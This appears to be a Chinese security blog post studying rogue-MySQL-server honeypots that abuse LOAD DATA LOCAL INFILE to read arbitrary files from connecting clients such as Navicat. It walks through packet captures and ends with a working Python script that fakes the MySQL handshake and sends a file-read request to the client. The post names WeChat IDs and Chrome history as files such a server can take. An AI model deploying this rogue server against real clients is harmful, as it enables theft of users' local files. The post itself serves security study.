更新时间：2022.08.16
# 本文未经过授权，禁止转发至微信公众号
# 1\. 反制介绍
## 1.1 前言
前天在网上看到巨佬`abc123`分析的一篇文章：  
在这里分析了`cs`服务器被人反打的问题，师傅对其中的`mysql`蜜罐反制做了复现，并且成功实现反制。在这篇文章中，有一个比较特别的地方：只要连到`mysql`就会读取到本地的任意文件，并不需要一定要`mysql`连接成功。  
这一点比较重要，本文将对`mysql`蜜罐来做一个学习，其实在早些时候，`ling`师傅已经发过一篇`mysql`蜜罐反制的文章了：
    https://cloud.tencent.com/developer/article/1856248
但是网上很多文章都是基于`Navicat`来连接反制的，本文将对其进行一一复现学习。  
本文内容较多，后期我也会录制视频来讲解下。
## 1.2 反制思路
`MySQL`服务端可以利用`LOAD DATA
LOCAL`命令来读取`MYSQL`客户端的任意文件，然后伪造恶意服务器向连接到这个服务器的客户端发送读取文件的`payload`。  
`Load data infile`是`MySQL`的一个高效导入数据的方法，它的速度非常快。是`MySQL`里一款强大的数据导入工具。  
网上有很多文章分析，`mysql`蜜罐反制是可以读取到本地的任意文件的，比如：微信`id`、`Chrome`历史记录等。
# 2\. mysql连接分析
先不着急对反制进行学习，在这里先对`mysql`进行通讯的过程进行学习。
## 2.1 环境准备
云服务器`vps`上使用`phpstudy`开启`mysql`，并且将其设置为支持外联。
    use mysql; （加载数据库）
    grant all privileges on *.* to root@'%' identified by '你的密码'; （修改登录主机 % 为任意主机）
    flush privileges;  （刷新权限）
在本地连接一下试试：  
`1*.*.**.*5`  
账号：`root`  
密码： ** *********
在这里使用命令行访问的同时打开Wireshark：  
到此，分析一下流量。
## 2.2 mysql登录认证分析
当前是一个登录的过程：  
首先是`Greeting`包，返回了服务端的`Version`等信息。
第二阶段是用户登录，当前可以看到用户名和密码hash值：
认证成功：  
如果是账号或者密码错误的时候：  
当我们发送一个查询指令的时候：  
但是`Navicat`登录认证和以上的稍微有一些不同，在这里以`Windows`试用版的`Navicat`为例分析下。
# 3\. Navicat登录认证分析
本文以Navicat16 试用版为例进行分析，登录流程与上述分析相差不多，在登录认证成功之后多了一个查询的操作：
    SET NAMES utf8mb4SET
问题就出在这个位置，下面结合`mysql`特性和`Navicat`特性来学习。
## 3.1 mysql特性
MySQL服务端可以利用`LOAD DATA
LOCAL`命令来读取`MYSQL`客户端的任意文件，然后伪造恶意服务器向连接到这个服务器的客户端发送读取文件的`payload`。  
`load data infile`语句从一个文本文件中以很高的速度读入一个表中。  
首先在本地使用`phpstudy`开启数据库，并且使用`Navicat`进行连接：
在这里使用命令查询`Load data infile`命令是否开启：
    show global variables like'local_infile';
当前可以看到在`phpstudy`中该功能是默认开启的，如果没有开启的话，可以使用以下命令开启：
    set global local_infile=1;
然后新建一个表为`test1`，在本地执行以下命令：
    load data local infile 'C:/phpstudy2018/PHPTutorial/WWW/1.txt' into table test.test1 fields terminated by '\n';
执行之后，刷新`test1`的表：  
此时写入成功。
## 3.2 Navicat通讯分析
在`Navicat`建立一个新的`mysql`连接中，一共产生了如下的流量：  
在这里和最开始上面的`mysql`认证分析相差无异，在这里继续模拟一下`load data infile`的功能，看下这个流量有何不同。  
以下过程均开启`wireshark`分析流量：  
远程数据库新建一个`表2`：  
直接执行一下上面的那个命令，记得修改下表名为`test2`：
    load data local infile 'C:/phpstudy2018/PHPTutorial/WWW/1.txt' into table test.test2 fields terminated by '\n';
此时执行成功：  
刷新一下表之后，数据写入成功：  
注意：在这里加载的是客户端的本地文件数据，写入到远程的服务端的数据库中。  
在这个过程里面因为流量很杂，所以我们将`test2`的表新建之后，删除其中字段的值，将链接断开，只抓取`mysql`登录之后，请求文件的操作，整个流量过滤一下。  
在整个过滤的数据中，找到了请求读取文件的语句：
重点看一下应答：  
将当前的信息分为`4个`部分：
在这个图中：
  * 第一个位置`00 00 01`值得是数据包的序号
  * 第二个位置`fb`是包的类型
  * 第三个位置是从`fb`开始到最后，为文件名
  * 第四个位置为从`fb`开始到最后的文件名长度，为`16进制`的，十六进制的`26`转化为十进制为`38`。
解码情况如下：  
然后读取文件内容到指定位置：  
在`Navicat`连接`mysql`的过程中可以看到，首先需要建立一个连接，然后再发送自动发送`SET NAMES utf8mb4`
，最后构造`Response
TABULAR`包的`payload`来返回给客户端，然后请求下载客户端的文件。当然，在这个过程中，是人为的请求将本地的文件上传到远程服务器上的，具体流程可以见下图：  
图片来源：  
# 4\. Navicat反制的坑
通过以上流程可以知道，如果是针对数据库管理软件`Navicat`，并且开启了`load data
infile`功能，理论上来说，就可以进行反制，在这里借用师傅在以下文章中的代码：  
使用`socket`模块来模拟一个`mysql`认证的流程：
    import socket
    serversocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
    port = 3306
    serversocket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    serversocket.bind(("", port))
    serversocket.listen(5)
    while True:
        # 建立客户端连接
        clientsocket,addr = serversocket.accept()      
        print("连接地址: %s" % str(addr))
        # 返回版本信息
        version_text = b"\x4a\x00\x00\x00\x0a\x38\x2e\x30\x2e\x31\x32\x00\x08\x00\x00\x00\x2a\x51\x47\x38\x48\x17\x12\x21\x00\xff\xff\xc0\x02\x00\xff\xc3\x15\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x7a\x6f\x6e\x25\x61\x3e\x48\x31\x25\x43\x2b\x61\x00\x6d\x79\x73\x71\x6c\x5f\x6e\x61\x74\x69\x76\x65\x5f\x70\x61\x73\x73\x77\x6f\x72\x64\x00"
        clientsocket.sendall(version_text)
        try:
            # 客户端请求信息
            clientsocket.recv(9999)
        except Exception as e:
            print(e)
        # Response OK
        verification = b"\x07\x00\x00\x02\x00\x00\x00\x02\x00\x00\x00"
        clientsocket.sendall(verification)
        try:
            # SET NAMES utf8mb4
            clientsocket.recv(9999)
        except Exception as e:
            print(e)
        # Response TABULAR
        evil_response = b"\x09\x00\x00\x01\xfb\x43\x3a\x2f\x31\x2e\x74\x78\x74"
        clientsocket.sendall(evil_response)
        # file_text
        print(clientsocket.recv(9999))
        clientsocket.close()
在本地运行之后，使用ssh工具去登录：  
此时显示`mysql`登录成功。  